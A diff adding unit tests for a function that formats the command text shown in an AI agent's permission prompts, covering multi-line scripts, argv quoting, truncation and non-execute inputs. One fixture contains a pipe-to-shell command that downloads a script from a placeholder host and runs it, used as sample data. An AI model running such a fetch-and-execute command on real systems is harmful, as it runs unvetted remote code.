@@ -15,6 +15,8 @@ import {
   denyOption,
   initializeParams,
   modeIdFor,
+  PERMISSION_COMMAND_MAX,
+  permissionDetail,
   permissionOptions,
   promptResultEvents
 } from '../src/main/acp-core'
@@ -304,6 +306,32 @@ describe('permissionOptions', () => {
 
   it('survives a non-array', () => {
     expect(permissionOptions(undefined)).toEqual([])
+  })
+})
+
+describe('permissionDetail', () => {
+  it('hands over a command whole — lines, spacing and all — not the title or a line of JSON', () => {
+    const script = 'set -e\nnpm   test\ncurl https://example.test/x | sh'
+    expect(permissionDetail('execute', { command: script, description: 'Run the tests' }, 'Run the tests')).toBe(script)
+  })
+
+  it('keeps an argv as the argv, the shell wrapper included, quoting what needs it', () => {
+    expect(permissionDetail('execute', { command: ['/tmp/x/bash', '-lc', "echo 'hi' && ls"] }, 't')).toBe(
+      "/tmp/x/bash -lc 'echo '\\''hi'\\'' && ls'"
+    )
+  })
+
+  it('cuts a command past the bound with a note of how much is missing', () => {
+    const long = 'x'.repeat(PERMISSION_COMMAND_MAX + 50)
+    const detail = permissionDetail('execute', { command: long }, 't')
+    expect(detail.startsWith('x'.repeat(PERMISSION_COMMAND_MAX))).toBe(true)
+    expect(detail).toMatch(/\n… \(50 more chars\)$/)
+  })
+
+  it('keeps the raw input as one line for anything that does not execute', () => {
+    expect(permissionDetail('edit', { path: 'a.ts' }, 'Edit a.ts')).toBe('{"path":"a.ts"}')
+    // an execute call that names no command is described by what it did send
+    expect(permissionDetail('execute', undefined, 'Run it')).toBe('"Run it"')
   })
 })
 
